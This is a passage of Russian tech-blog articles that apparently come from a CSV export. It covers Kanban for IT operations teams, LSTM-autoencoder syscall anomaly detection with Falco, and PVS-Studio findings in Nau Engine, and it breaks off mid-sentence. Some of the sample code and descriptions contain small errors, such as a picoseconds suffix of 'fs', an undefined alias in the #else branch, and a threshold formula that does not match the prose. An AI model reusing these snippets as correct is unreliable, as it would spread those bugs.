серверов и другие регулярные меры, которые позволяют ИТ-системе стабильно работать. Все эти задачи поступают из разных источников, часто конфликтуют по приоритетам и требуют немедленного реагирования. Если нет четкой и понятной системы управления, команда рискует столкнуться с такими неприятностями:работа будет невидимой. Вот инженер всю смену тушит пожары: устраняет инциденты, консультирует коллег, отвечает на экстренные запросы. Но в отчетах его работа не фиксируется, ведь задачи приходили хаотично и не были отражены в системе. В итоге создается впечатление, что он «ничего не делает»;вы потеряете эффективность, потому что множество задач придется отрабатывать параллельно. Допустим, специалист начинает разбираться с падением базы данных, но тут же поступает срочный запрос на устранение сетевого сбоя. В попытках разорваться между задачами он теряет концентрацию, переключается туда-сюда. В итоге не успевает качественно решить ни одну из проблем;незавершенные работы будут накапливаться и замедлять поток. Из-за постоянных переключений команда может не успеть закончить даже простые задачи. В бэклоге набираются недоделанные обновления, отложенные тикеты, долгие расследования инцидентов. Все это тянет работу вниз, замедляя процесс и повышая уровень стресса в команде.Теперь главный вопрос: как не терять эффективность и спасти сотрудников от выгорания? Конечно, нужно найти метод, который поможет структурировать процессы и сохранить продуктивность. Вариантов тут несколько.Классический Scrum подходит для работы с четко спланированными задачами в фиксированных итерациях. Но, как вы уже поняли, эксплуатационные команды сталкиваются с другой реальностью: иногда запросы решаются за минуту, а иногда — за месяцы. Жесткие рамки спринта не позволяют учитывать эту вариативность. К тому же решение и обработка запросов широко декомпозируются. Каждую подзадачу можно оформить как отдельную, и она прекрасно ляжет в итерационный процесс. Получается, тут нужен баланс между гибкостью и структурой. Именно поэтому мы решили замиксовать Scrum и Kanban. Это позволило нам взять преимущества обоих методов и эффективно справляться с нагрузкой. Подробнее об этом еще скажу ниже, а пока — о втором методе.Kanban в эксплуатационных командахКоротко о базе. Kanban — это метод управления работой, который основывается на визуализации процессов и ограничении незавершенных задач (WIP-лимиты). Представьте доску, где все задачи команды распределены по колонкам: «В работе», «Ожидание» и «Готово». Если в колонке «В работе» уже висит максимальное количество задач, новые брать нельзя, пока не завершены текущие. Такой подход предотвращает перегрузку, помогает сфокусироваться на выполнении задач до конца и обеспечивает прозрачность процессов.Теперь о том, как адаптировать его для эксплуатационных команд. Шаг 1. Разделить поток на типы работ. Для повышения управляемости и прозрачности Kanban-доска должна отражать разные типы задач:инциденты — высокий приоритет, требует немедленного решения. Например, падение сервиса;плановые изменения — запросы, связанные с обновлением систем, внедрением новых функций;обслуживание — например, мониторинг или резервное копирование; улучшения — долгосрочные инициативы по повышению качества сервисов или автоматизации.Каждый тип работ можно отобразить отдельными потоками или колонками на доске, чтобы не смешивать задачи с разным приоритетом и временем исполнения.Шаг 2. Ограничить незавершенные задачи (WIP-лимиты). Для каждого типа задач устанавливаются WIP-лимиты. Например:не более пяти инцидентов в активной обработке;не более трех параллельных изменений;не более двух задач на улучшения.Это защищает сотрудников от перегрузки и помогает сконцентрироваться на том, чтобы вовремя завершить текущую работу.Шаг 3. Учесть SLA. В эксплуатационных командах важно соблюдать сроки выполнения задач, особенно если это инциденты. В Kanban-доске можно добавить индикаторы времени — например, SLA-метки или оставшийся период до дедлайна.Шаг 4. Расставить приоритеты. Инциденты, не решенные в установленный срок, автоматически эскалируются. На доске можно выделить зону для задач, требующих вмешательства руководителя или другой команды.Шаг 5. Обеспечить прозрачность и координацию. Kanban-доска позволяет всем заинтересованным видеть текущий статус задач. Это особенно важно при взаимодействии между группами (например, сетевой отдел, DevOps, служба мониторинга), когда над одним проектом работают несколько специалистов.Kanban-каденцииKanban-каденции — это регулярные встречи команды эксплуатации. Тут можно выделить:ежедневные Kanban-митинги — обсуждаются статусы задач, собирается обратная связь от коллег и анализируются возможные проблемы;встречи по пополнению доски — определение приоритетных задач для добавления в работу;обзор сервиса поставки — анализ эффективности процесса и поиск возможностей для улучшения.Благодаря регулярным встречам мы видим, где возникают задержки, как распределяется нагрузка и как меняется производительность. Объективно оценивать эти показатели помогают метрики. Дальше — как раз о них.О метрикахА вот что важно для нас:Cycle Time, или время выполнения. Помогает анализировать, сколько времени нужно для завершения задачи от начала до конца;процент выполнения SLA. Показывает, насколько команда соответствует ожиданиям клиентов;среднее количество WIP. Эта метрика помогает выявить узкие места. Например, если команда эксплуатации регулярно упирается в лимит незавершенных задач, это может указывать на недостаток ресурсов, слишком долгие согласования или зависимость от других команд;частота инцидентов. Позволяет анализировать и прогнозировать нагрузку.Отслеживать эти показатели можно с помощью Jira Service Management, ServiceNow, Kanbanize и других инструментов.Наш опыт внедрения Scrum и KanbanКак я уже сказал выше, мы комбинируем подходы Scrum и Kanban. Так у нас лучше получается сбалансировать долгосрочное планирование и оперативное выполнение задач.Kanban-доска отражает эпики — крупные блоки без привязки к датам. Они помогают видеть общие направления работы. В классическом понимании Kanban обычно не подразумевает работу с эпиками, это больше характерно для Scrum и гибридных методологий. Но в эксплуатационной команде использование эпиков как крупных блоков работ — допустимый подход.Доска с элементами Scrum — без жестких итераций. В ней собраны конкретные задачи, которые берутся в недельные спринты и прорабатываются командой.Для аналитики каждая задача помечается двумя хештегами из заранее определенного каталога. Хештег первого уровня указывает на сервис или систему. Второго — уточняет тип запроса. Чего мы добились с таким подходом:обеспечили прозрачность работы. Теперь у нас есть четкое разделение стратегических (эпики) и тактических (задачи) активностей;контролируем нагрузку. Спринты помогают ограничивать объем задач, а Kanban-доска дает обзор долгосрочных целей;анализируем обращения и эффективно используем ресурсы. С хештегами мы видим, на каких сервисах максимум нагрузки и какие работы требуют больше внимания. Это помогает распределять ресурсы и планировать улучшения.Структурируя поток задач и используя WIP-лимиты, мы научились справляться с непредсказуемой работой, концентрироваться на важном и избегать перегрузок. Хаос, конечно, никуда не делся, но нам удалось его приручить."
78,UEBA в кибербезе: как профилирование поведения пользователей на основе Autoencoder помогает выявлять угрозы и аномалии,Газинформсервис,Надежные решения для безопасности бизнеса,0,"Программное обеспечение, Консалтинг и поддержка, Информационная безопасность",2025-04-09,"В современном мире количество атак растёт пропорционально количеству внедрений новых технологий, особенно когда технологии ещё недостаточно изучены. В последнее время атаки становятся всё более разнообразными, а методы их реализации — всё более изощрёнными. Дополнительные проблемы несут и методы искусственного интеллекта, которыми вооружаются специалисты RedTeam. В руках опытного специалиста эти инструменты становятся реальной угрозой безопасности потенциальных целей. Большинство средств информационной безопасности основаны на корреляционных или статистических методах, которые в современных реалиях часто оказываются неэффективными. Что же тогда остаётся специалистам BlueTeam?Для нивелирования рисков, связанных с новыми атаками и уязвимостями, специалисты в области кибербезопасности совместно с разработчиками средств защиты информации разрабатывают инструменты на основе технологии UEBA. Эта технология позволяет анализировать поведение пользователей и сущностей, к которым могут относиться процессы, виртуальные машины, контейнерные системы и другие элементы. Такой подход основан на профиле, формируемом на основе данных о легитимном поведении. В качестве таких данных обычно используется последовательность действий, которая может включать информацию о сетевых соединениях, выполненных процессах и других аспектах.В качестве методов практической реализации этого подхода зачастую используются нейронные сети, которые в научных кругах известны как методы глубокого машинного обучения. Они реализованы по принципу и подобию организации человеческого мозга и обладают преимуществом перед традиционными методами машинного обучения за счёт иерархической структуры и использования нелинейных функций активации. Реализация UEBA на основе нейронной сетиДля обнаружения аномалий отлично подходит нейронная сеть на основе автокодировщика (Autoencoder, AE). Эта сеть состоит из двух симметричных компонентов: кодера и декодера. Кодер преобразует входные данные в представление меньшей размерности, а декодер восстанавливает их обратно. В процессе обучения модель AE стремится минимизировать ошибку реконструкции данных. Когда данные подаются в модель нейронной сети AE, вычисляется ошибка реконструкции. Если ошибка превышает заданный порог, это сигнализирует о наличии аномалии в данных, указывая на то, что модель не была обучена на них. Следует отметить, что чем больше данные отличаются от тех, на которых была обучена модель, тем больше будет ошибка реконструкции. Таким образом, можно сказать, что при использовании этой нейронной сети и данных о поведении реализуется подход на основе сигнатур (если рассматривать данные как некую сигнатуру, а модель — как условие сравнения). Такой подход позволяет эффективно выявлять отклонения от нормального поведения в анализируемых данных. Однако, поскольку UEBA подразумевает анализ поведения, которое представляет собой последовательность действий, стандартный автокодировщик не всегда подходит для этой задачи. Это связано с тем, что он обрабатывает каждую строку из последовательности независимо, не учитывая временные зависимости и контекст между данными в последовательности. В результате классический автокодировщик не способен распознавать изменения во времени или последовательности событий, что критично для обнаружения аномалий при работе с последовательными данными.Для эффективного анализа поведения целесообразно расширить существующий автокодировщик, добавив слои нейронной сети, способные учитывать зависимости и контекст в последовательных данных. Яркими представителями таких нейронных сетей являются рекуррентные нейронные сети (Recurrent Neural Networks, RNN): управляемые рекуррентные блоки (Gated Recurrent Unit, GRU) и долгая краткосрочная память (Long short-term memory, LSTM).В данном случае предпочтительнее использовать LSTM, так как эта архитектура включает три вентиля: входной вентиль, вентиль забывания и выходной вентиль. В отличие от GRU, у которой всего два вентиля —обновления и сброса, — LSTM обеспечивает более точный контроль над потоком информации. Это позволяет LSTM более эффективно изучать сложные долгосрочные зависимости в данных, что делает её особенно подходящей для задач, требующих глубокого анализа последовательной информации.Что же дальше?Первым делом нужно определиться, с какими данными мы будем работать и как их предобработать для обучения модели нейронной сети. Тут стоит отметить, что, в отличие от классических методов машинного обучения, методы глубокого машинного обучения работают исключительно с числовыми признаками. К примеру, наша задача заключается в обнаружении аномальных последовательностей системных вызовов (syscalls) в операционных системах семейства Linux. Следует отметить, что в каждой ОС syscalls будут отличаться. Однако можно использовать Falco Security в качестве коллектора syscalls, поскольку он предлагает унифицированный список поддерживаемых syscalls, а гибкая система правил позволяет организовать сбор этих данных и осуществлять фильтрацию по имени пользователя. Используемое правило Falco Security для сбора syscalls представлено в листинге 1. Листинг 1. Правило Falco Security# falco rule - rule: DescH   desc: DescH   condition: container.id = host and syscall.type != <NA>   output: (user=%user.name process name=%proc.name process id=%proc.pid syscall=%syscall.type)   priority: WARNINGЭто правило позволяет собирать все syscalls, если объект, их сгенерировавший, является хостом (container.id = host). Листинг 2. Данные, собранные с помощью Falco Security09:13:06.983121125: Warning (user=root process name=mount process   id=15192 syscall=access)09:13:06.983126936: Warning (user=root process name=mount process   id=15192 syscall=access)09:13:06.983135592: Warning (user=root process name=mount process   id=15192 syscall=mount)09:13:06.983307873: Warning (user=root process name=mount process   id=15192 syscall=mount)09:13:06.983322449: Warning (user=root process name=mount process   id=15192 syscall=ioctl)09:13:06.983329802: Warning (user=root process name=mount process   id=15192 syscall=ioctl)В данном листинге отображена следующая информация: 09:13:06.983121125 (время), Warning (метка приоритета), user=root (имя пользователя), process name=mount (имя процесса), process id=15192 (идентификатор процесс) и syscall=access (syscall).После того, как данные собраны, последовательность syscalls нужно разделить на последовательности с помощью так называемой техники скользящего окна со смещением на +1. Размер скользящего окна может быть произвольного размера, но следует отметить, что за один процесс выполняется в среднем от 60 до 80 syscalls. Таким образом, размер скользящего окна можно назначить в 300 syscalls, что будет равно от 4 до 5 процессов. Листинг 3. Сгенерированные последовательности с помощью техники скользящего окнаПоследовательность # 1 accessaccessmountmountioctlioctl…Последовательность # 2 accessmountmountioctlioctl…Последовательность # 3mountmountioctlioctl…После чего нужно их преобразовать в числовые признаки. Для этого достаточно создать словарь c syscalls, где каждому syscall будет соответствовать идентификатор. Таким образом сформированные последовательности и будут эталонным профилем легитимного поведения конкретного пользователя.Архитектура модели нейронной сетиПоскольку мы будем обнаруживать аномалии в последовательных данных, мы будем использовать модель нейронной сети AE-LSTM. Эта модель является более предпочтительной, поскольку она сочетает в себе преимущества AE и LSTM. Она позволяет эффективно выявлять отклонения в данных за счёт вычисления ошибки реконструкции, как в случае если бы мы просто использовали классический автокодировщик. Однако мы расширили модель дополнительными слоями LSTM, что позволяет эффективно работать с последовательными данными. Таким образом, предлагаемая модель является неконтролируемой и строится исключительно на данных легитимной активности, что позволяет избавиться от явной разметки данных, которая в реальных условиях часто затруднена или вовсе невозможна. В этом случае нейронная сеть состоит из входного слоя, нескольких скрытых слоев и выходного слоя. Размерность входного и выходного слоев равна количеству syscalls в последовательности (в данном случае 300 (len)). Первый и третий скрытый слой содержит вдвое меньше нейронов (len // 2), чем входной и выходной слои, второй скрытый слой содержит вчетверо меньше нейронов (len // 4), чем входной и выходной слои, как указано на рисунке 1. Рис. 1. Модель AE-LSTMПредставленная архитектура нейронной сети обладает несколькими преимуществами. Во-первых, такая структура позволяет эффективно извлекать и обрабатывать информацию, уменьшая размерность данных на каждом уровне, что снижает вычислительную нагрузку и предотвращает переобучение модели. Во-вторых, уменьшение числа нейронов в скрытых слоях помогает сосредоточиться на наиболее значимых признаках, что улучшает обобщающую способность нейронной сети. Эта иерархическая структура также способствует более глубокому обучению, позволяя модели выявлять сложные зависимости и шаблоны в данных, что особенно важно при анализе последовательностей syscalls.Листинг 4. Функция создания модели нейронной сетиdef create_ae_lstm_model(input_length):     # Размерность входного и выходного слоев     input_dim = input_length  # В данном случае 300     output_dim = input_length  # В данном случае 300     # Входной слой     inputs = Input(shape=(None, input_dim))     # Кодер     encoded = LSTM(input_dim // 2, activation='relu', return_sequences=True)(inputs)     encoded = LSTM(input_dim // 4, activation='relu')(encoded)     # Повторение вектора для декодера     decoded = RepeatVector(output_dim)(encoded)     # Декодер     decoded = LSTM(input_dim // 2, activation='relu', return_sequences=True)(decoded)     decoded = LSTM(output_dim, activation='relu', return_sequences=True)(decoded)     # Создание модели     model = Model(inputs, decoded)     # Компиляция модели с оптимизатором Adam и функцией потерь MSE     model.compile(optimizer=Adam(), loss='mean_squared_error')     return modelОбучение модели нейронной сетиПроцесс обучения модели нейронной сети для удобства основан на автономном подборе параметров обучения, таких как batch size (количество обучающих примеров, используемых за одну итерацию обучения), который по умолчанию равен 1, и количество epochs (количество итераций обучения), которое определяется результатами обучения. Начальное количество epochs и batch size — 1. Таким образом, если уровень потерь при первой итерации обучения ниже 0.5 или превышает 1%, модель считается необученной, а количество epochs увеличивается. Процесс обучения длится до тех пор, пока уровень потерь не будет в диапазоне от 0.5 до 1% или количество эпох не достигнет 100. В случае, если процесс обучения не увенчался успехом, модель выбирает наилучший показатель потерь и переобучается с параметрами, соответствующими этому уровню потерь.Ряд экспериментов показал, что совокупность такой архитектуры модели нейронной сети и уровня потерь в диапазоне от 0.5 до 1% позволяет достичь оптимального баланса точности и количества ложных срабатываний. Также установленный размер batch size в 1 позволяет достичь лучших показателей во время обучения (размер потерь в диапазоне от 0.5 до 1%), чем при ином размере batch size. Для обучения модели использовалась комбинация оптимизатора Adam и функции потерь MSE, выбранная благодаря нескольким преимуществам. Оптимизатор Adam обеспечивает быструю и стабильную сходимость при обучении модели реконструкции данных, а MSE количественно оценивает ошибку этой реконструкции, где её высокий уровень свидетельствует об аномальном поведении. Таким образом, высокая чувствительность MSE к выбросам делает её незаменимой для обнаружения аномалий. В качестве функции активации была выбрана ReLU, поскольку она обеспечивает быстрое выполнение операций, тем самым минимизируя затраты вычислительных ресурсов.ОбнаружениеВо время обнаружения данные передаются в модель для классификации поведения как легитимного или аномального на основе вычисления ошибки реконструкции. Если она превышает допустимое значение, это свидетельствует об аномальных значениях в данных. Порог ошибки реконструкции, в свою очередь, рассчитывается на основе показателей MSE между исходными и данными после реконструкции и определяется как сумма среднего значения MSE и его стандартного отклонения. Тут следует отметить, что установка порогового значения ошибки реконструкции, основанного на среднеквадратичной ошибке MSE, позволяет эффективно различать нормальные и аномальные данные, обеспечивая высокую точность и надёжность модели.Листинг 5. Расчёт ошибки реконструкцииmse = np.mean(np.square(sequences - reconstructions), axis=(0)) threshold = np.mean(mse) + 2 * np.std(mse) anomaly_indices = np.where(mse > threshold)[0]Посмотрим на результат обнаружения:Листинг 6. Результат обнаружения аномалийAn anomalous example was found: [… access, access, mount, mount, ioctl,   ioctl … ]ЗаключениеПредставленный подход направлен на обнаружение аномального поведения, которое может включать как необычные последовательности действий, так и целенаправленное деструктивное воздействие, такое как повышение привилегий (Privilege Escalation) и другие. Например, сетевые атаки на веб-приложения, такие как SQL-инъекции, могут остаться незамеченными, поскольку с точки зрения обычного запроса к базе данных они ничем не отличаются. Также следует отметить, что одной из ключевых проблем при обучении моделей нейронных сетей являются большие объёмы данных. Для решения этой проблемы необходимо использовать различные методы оптимизации обучающих наборов данных. К ним можно отнести метод главных компонент (PCA, Principal Component Analysis), фильтрацию, корреляцию и другие."
79,Третья часть исследования Nau Engine,PVS-Studio,"Статический анализ кода для C, C++, C# и Java",0,"Программное обеспечение, Информационная безопасность",2025-04-09,"В финальной части нашей трилогии, посвящённой Nau Engine, мы уделим внимание ошибкам, возникающим при разработке классов. Приведённые в статье примеры наглядно демонстрируют, как даже небольшие недоработки могут обернуться серьёзными проблемами в работе приложения.Как уже сказано в начале, это третья статья про проверку Nau Engine. В первой части мы рассмотрели функционал Nau Engine с акцентом на три группы ошибок: проблемы управления памятью, избыточное копирование кода и логические недочёты. Во второй части обсуждались ключевые аспекты оптимизации и повышения производительности.Теперь предлагаю сфокусироваться на ошибках, обнаруженных статическим анализатором PVS-Studio в процессе разработки классов.Фрагмент N1template <std::derived_from<Attribute> K, typename T> struct AttributeField {   using Key = K;   using Value = T;    T value;    AttributeField(T&& inValue) :     value(std::move(value))   {   }    AttributeField(TypeTag<Key>, T&& inValue) :     value(std::move(inValue))   {   } }; Предупреждение PVS-Studio: V546 Member of a class is initialized with itself: 'value(std::move(value))'. attribute.h 118В этом коде допущена ошибка, связанная с тем, что в первом конструкторе поле AttributeField::value инициализируется самим собой. В результате переменная используется до своей фактической инициализации, что приводит к неопределённому поведению. Такой код может привести к неожиданным ошибкам, затруднить отладку и оставить объект в некорректном состоянии.Исправленный вариант инициализации должен использовать переданный аргумент inValue, а не сам член класса:AttributeField(T&& inValue) :   value(std::move(inValue)) { } Фрагмент N2class NAU_ANIMATION_EXPORT AnimationInstance : public virtual IRefCounted {   .... private:   friend class KeyFrameAnimationPlayer;    AnimationState m_animationState;    nau::Ptr<Animation> m_animation;   AnimationAssetRef m_animationAsset;   ....   eastl::string m_name; };  AnimationInstance::AnimationInstance(const eastl::string& name,                                       AnimationAssetRef&& assetRef)   : m_name(name) {   m_animationAsset = std::move(assetRef); } Предупреждение PVS-Studio: V730 Not all members of a class are initialized inside the constructor. Consider inspecting: m_animationState. animation_instance.cpp 28В этом фрагменте рассматривается конструктор класса AnimationInstance, который принимает два параметра: имя объекта и rvalue ссылку на assetRef. Обратите внимание, что в списке инициализации и теле конструктора явно задаются лишь значения для m_name и m_animationAsset, в то время как поле m_animationState остаётся без инициализации. Такая ситуация может привести к неопределённому поведению, поскольку неинициализированные члены класса потенциально содержат мусорные значения из-за default-инициализации. Вероятно, автор кода забыл добавить инициализацию для всех членов класса. Рекомендуется обеспечить явную инициализацию каждого поля: либо через список инициализации конструктора, либо посредством значений по умолчанию при объявлении, чтобы гарантировать корректное состояние объекта при его создании.Фрагмент N3class NAU_KERNEL_EXPORT LzmaLoadCB : public IGenLoad { public:   ....   ~LzmaLoadCB()   {     close();   }   .... };  void LzmaLoadCB::close() {   if (isStarted && !isFinished && !inBufLeft && rdBufPos >= rdBufAvail)     ceaseReading();   .... } Предупреждение PVS-Studio: V1053 Calling the 'ceaseReading' virtual function indirectly in the destructor may lead to unexpected result at runtime. Check lines: 'dag_lzmaIo.h:27', 'lzmaDecIo.cpp:48', 'dag_genIo.h:249'. dag_lzmaIo.h 27В этом примере класс LzmaLoadCB реализует деструктор, в котором сначала вызывается функция close, а затем при выполнении определённого условия происходит вызов функции ceaseReading, объявленной как виртуальная в базовом классе IGenLoad. Вызов виртуальных функций в контексте конструирования или разрушения объекта может быть опасным: на этом моменте у объекта либо ещё не инициализированы производные части (конструирование), либо уже уничтожены его наиболее производные части (разрушение). Это означает, что, если у виртуальной функции ceaseReading есть переопределение в наиболее производном классе, на момент работы конструктора или деструктора всегда будет вызвана виртуальная функция из текущего или базового класса. Это может привести к игнорированию важного функционала, реализованного в наиболее производном классе. Лучше избегать подобных вызовов в конструкторах и деструкторах, чтобы не нарушить корректность работы программы.И вот ещё случаи:V1053 Calling the 'Type' virtual function indirectly in the constructor may lead to unexpected result at runtime. Check lines: 318, 252, 245. d3dx12_state_object.h 318Фрагмент N4FsPath& FsPath::operator=(FsPath&& other) {     m_path = std::move(other.m_path);     other.m_path.clear();     return *this; } Предупреждение PVS-Studio: V794 The assignment operator should be protected from the case of 'this == &other'. fs_path.cpp 36В представленном фрагменте реализован оператор перемещения присваивания класса FsPath, в котором происходит перенос данных из объекта other в текущий экземпляр. Следует отметить, что отсутствует проверка на самоприсваивание (проверка вида (this == &other)), что может привести к нежелательным последствиям.Если объект пытаются присвоить самому себе, то операция m_path = std::move(other.m_path); перемещает содержимое other.m_path в m_path, а последующий вызов other.m_path.clear(); очищает данные. В результате m_path оказывается в неожиданном состоянии, и остаётся лишь пожелать удачной отладки :)Чтобы устранить этот риск, рекомендую добавить в начало оператора следующую проверку:if (this == std::addressof(other)) {     return *this; } Использование std::addressof вместо оператора & гарантирует корректное сравнение адресов даже при перегрузке оператора & в классе.Фрагмент N5// cocos2d::Node class CC_DLL Node : public Ref {   ....     virtual void reorderChild(Node* child, int localZOrder);   .... };   // nau::ui::Node class NAU_UI_EXPORT Node : virtual protected cocos2d::Node {   ....   virtual void reorderChild(Node* child, int zOrder);   .... }; Предупреждение PVS-Studio: V762 It is possible a virtual function was overridden incorrectly. See first argument of function 'reorderChild' in derived class 'Node' and base class 'Node'. node.h 145В примере определены два класса с именем Node:cocos2d::Node — оригинальный класс;nau::ui::Node — класс, который наследуется от cocos2d::Node.Проблема кроется в том, что функция reorderChild объявлена в обоих классах с первым параметром типа Node. Однако по правилам поиска неквалифицированных имён, при объявлении функции в базовом классе имя Node будет разрешёно как cocos2d::Node, а в производном классе — как nau::ui::Node. Из-за этого различия компилятор не сделает переопределение виртуальной функции из базового класса. В результате механизм виртуальных функций сработает некорректно, и при вызове метода через указатель на базовый класс выполняется версия из базового класса, что может привести к непредвиденному поведению программы.Чтобы избежать подобных ошибок, рекомендуется при переопределении виртуальных функций явно указать тип первого параметра, а также всегда не забывать о применении спецификатора override:// nau::ui::Node class NAU_UI_EXPORT Node : virtual protected cocos2d::Node {   ....   virtual void reorderChild(cocos2d::Node* child, int zOrder) override;   .... }; Это обеспечивает полное совпадение сигнатуры метода в производном классе с сигнатурой базового метода, и в случае несовпадения компилятор выдаст ошибку.И вот ещё случай:V762 It is possible a virtual function was overridden incorrectly. See first argument of function 'removeChild' in derived class 'Sprite' and base class 'Sprite'. sprite.h 87Фрагмент N6namespace std::chrono {     inline void PrintTo(milliseconds t, ostream* os)     {         *os << t.count() << ""ms"";     }  } // namespace std::chrono Предупреждение PVS-Studio: V1061 Extending the 'std' namespace may result in undefined behavior. stopwatch.h 26В пространство имён std::chrono добавили функцию PrintTo. Эта функция – один из способов научить GoogleTest печатать значения пользовательских типов, если для них не перегружен оператор <<. Согласно документации, нужно определить эту функцию в том же пространстве имён, где определён наш пользовательский тип. В данной ситуации, этим типом является специализация шаблона класса std::chrono::duration для работы с миллисекундами.Расширение стандартного пространства имён std (а также некоторых других пространств, например, posix) — опасная практика, которая может привести к неопределённому поведению. Проблема в том, что стандарт C++ предполагает неизменность своего пространства имён, а реализация библиотек может со временем расширяться, добавляя новые функции и типы. Если в std или его вложенных пространствах объявить пользовательскую функцию или класс, есть вероятность, что в одной из будущих версий стандарта появится аналогичное определение, что приведёт к конфликтам и нестабильной работе программы.Современный стандарт C++ разрешает добавлять сущности в std из достаточно скромного списка. И, к сожалению, обычные функции в этот список не входят. Поэтому поведение будет не определено при добавлении функции PrintTo для типа std::chrono::milliseconds. Но что же делать, если мы всё же хотим печатать время в миллисекундах в рамках GoogleTest? Есть два способа решения проблемы.Решение N1. В C++20 всё уже сделали за нас, оператор << уже определён для std::chrono::duration. Осталось лишь дождаться, когда в используемой вами стандартной библиотеке полноценно поддержат проползал P0355 :)Решение N2. Ну раз в стандартной библиотеке пока нет этого оператора, значит мы определим его сами в глобальном пространстве имён. А дальше же компилятор найдёт нужный нам оператор, ведь так?Нет, не найдёт.namespace internal_stream_operator_without_lexical_name_lookup {  // The presence of an operator<< here will terminate lexical scope lookup // straight away (even though it cannot be a match because of its argument // types). Thus, the two operator<< calls in StreamPrinter will find only ADL // candidates. struct LookupBlocker {}; void operator<<(LookupBlocker, LookupBlocker);  struct StreamPrinter {   template <typename T,             // Don't accept member pointers here. We'd print them via implicit             // conversion to bool, which isn't useful.             typename = typename std::enable_if<                 !std::is_member_pointer<T>::value>::type>   // Only accept types for which we can find a streaming operator via   // ADL (possibly involving implicit conversions).   // (Use SFINAE via return type, because it seems GCC < 12 doesn't handle name   // lookup properly when we do it in the template parameter list.)   static auto PrintValue(const T& value, ::std::ostream* os)       -> decltype((void)(*os << value)) {     // Call streaming operator found by ADL, possibly with implicit conversions     // of the arguments.     *os << value;   } };  }  // namespace internal_stream_operator_without_lexical_name_lookup Реализация GoogleTest ограничивает неквалифицированный поиск в обрамляющих пространствах имён (при помощи перегруженного оператора operator<<(LookupBlocker, LookupBlocker). А ADL ищет функции только в тех пространствах имён, где объявлены типы аргументов.Поэтому до C++20 и реализации проползала P0355 придётся использовать код похитрее. Мы унаследуемся от std::chrono::duration и разместим наследника в пространстве имён nau::test. Там же мы определим перегрузку оператора <<, который будет уметь печатать объекты типа std::chrono::duration в произвольный поток вывода. Далее, когда будет необходимо через GoogleTest напечатать длительность, нужно просто сконвертировать std::chrono::duration в нашего наследника.Возможная имплементация.#include <iostream> #include <chrono>  #define HAS_OVERLOADED_OPERATOR_LTLT_FOR_CHRONO 0 #define HAS_CTAD_FEATURE 0  #ifdef __has_include   #if __has_include(<version>)     // use feature test macro     #include <version>      // check for the 'operator<<' in the standard library     #if defined(__cpp_lib_chrono) && __cpp_lib_chrono >= 201907L       #undef HAS_OVERLOADED_OPERATOR_LTLT_FOR_CHRONO       #define HAS_OVERLOADED_OPERATOR_LTLT_FOR_CHRONO 1     #endif      // check for class template argument deduction feature     #if defined(__cpp_deduction_guides) && __cpp_deduction_guides >= 201703L       #undef HAS_CTAD_FEATURE       #define HAS_CTAD_FEATURE 1     #endif   #endif #endif  namespace nau::test { #if !HAS_OVERLOADED_OPERATOR_LTLT_FOR_CHRONO   template <typename Rep, typename Period>   struct duration : public std::chrono::duration<Rep, Period>   {     using base_class = std::chrono::duration<Rep, Period>;     using base_class::base_class;      duration(const base_class &base) : base_class { base } {}   };    #if HAS_CTAD_FEATURE   template <typename Rep, typename Period>   duration(const std::chrono::duration<Rep, Period> &) -> duration<Rep, Period>;   #endif    template <typename Rep, typename Period>   using duration_wrapper = duration<Rep, Period>;    using milliseconds_wrapper = duration<std::chrono::milliseconds::rep,                                         std::chrono::milliseconds::period>;                                            using nanoseconds_wrapper = duration<std::chrono::nanoseconds::rep,                                        std::chrono::nanoseconds::period>;    template <typename Rep, typename Period>   std::ostream& operator<<(std::ostream& out,                            const std::chrono::duration<Rep, Period>& obj)   {     using namespace std::literals;          std::string_view postfix = ""s""sv;     if constexpr (Period::type::num == 1)     {       // attoseconds, as            if constexpr (Period::type::den == 1000000000000000000)               postfix = ""as""sv;       // femtoseconds, fs       else if constexpr (Period::type::den == 1000000000000000)               postfix = ""fs""sv;       // picoseconds, ps       else if constexpr (Period::type::den == 1000000000000) postfix = ""fs""sv;       // nanoseconds, ns       else if constexpr (Period::type::den == 1000000000) postfix = ""ns""sv;       // microseconds, us       else if constexpr (Period::type::den == 1000000) postfix = ""us""sv;       // milliseconds, ms       else if constexpr (Period::type::den == 1000) postfix = ""ms""sv;       // centiseconds, cs       else if constexpr (Period::type::den == 100) postfix = ""cs""sv;       // deciseconds, ds       else if constexpr (Period::type::den == 10) postfix = ""ds""sv;     }     else if constexpr (Period::type::den == 1)     {       // minutes, min            if constexpr (Period::type::num == 60) postfix = ""min""sv;       // hours, h       else if constexpr (Period::type::num == 3600) postfix = ""h""sv;       // days, d       else if constexpr (Period::type::num == 86400) postfix = ""d""sv;       // decaseconds, das       else if constexpr (Period::type::num == 10) postfix = ""das""sv;       // hectoseconds, hs       else if constexpr (Period::type::num == 100) postfix = ""hs""sv;       // kiloseconds, ks       else if constexpr (Period::type::num == 1000) postfix = ""ks""sv;       // megaseconds, Ms       else if constexpr (Period::type::num == 1000000) postfix = ""Ms""sv;       // gigaseconds, ns       else if constexpr (Period::type::num == 1000000000) postfix = ""Gs""sv;       // teraseconds, ps       else if constexpr (Period::type::num == 1000000000000) postfix = ""Ts""sv;       // petaseconds, fs       else if constexpr (Period::type::num == 1000000000000000)               postfix = ""Ps""sv;       // exaseconds, Es       else if constexpr (Period::type::num == 1000000000000000000)               postfix = ""Es""sv;     }        out << obj.count() << postfix;     return out;   }  #else   template <typename Rep, typename Period>   using duration_wrapper = std::chrono::duration<Rep, Period>;    using milliseconds_wrapper = duration<std::chrono::milliseconds::rep,                                         std::chrono::milliseconds::period>;    using nanoseconds_wrapper = duration<std::chrono::nanoseconds::rep,                                        std::chrono::nanoseconds::period>; #endif } На посошок/**     Test:         Attributes with non-serializable values ​​and empty string keys         should not be accessible through the attribute container.  */ Предупреждение PVS-Studio: V1076 Code contains invisible characters that may alter its logic. Consider enabling the display of invisible characters in the code editor. test_runtime_attributes.cpp 91Анализатор обнаружил, что в комментарии к тесту закралась последовательность байтов E2 80 8B, которая интерпретируется как Zero Width Space (ZWSP). Этот символ представляет собой невидимый пробел, который не отображается на экране, но при этом остаётся частью текста.Воспользуемся HEX-редактором, что убедиться в этом:Сразу хочу сказать, что в этом коде никакого Trojan Source не заложено. Однако я хотел бы напомнить читателям, что такая опасность по-прежнему существует. Если опасные невидимые символы случайно окажутся или в имени переменной, или строковом литерале, или даже в комментарии, то поведение вашей программы может отличаться от того, что вы видите в коде. При этом компиляторы прекрасно пропускают такой код без ошибок.Хочу также отметить, что не всегда включение отображения невидимых символов в вашем редакторе кода полностью исправит положение. Троян может затесаться где-то среди сотен файлов, которые пришли вам в качестве Pull Request. Поэтому, чтобы 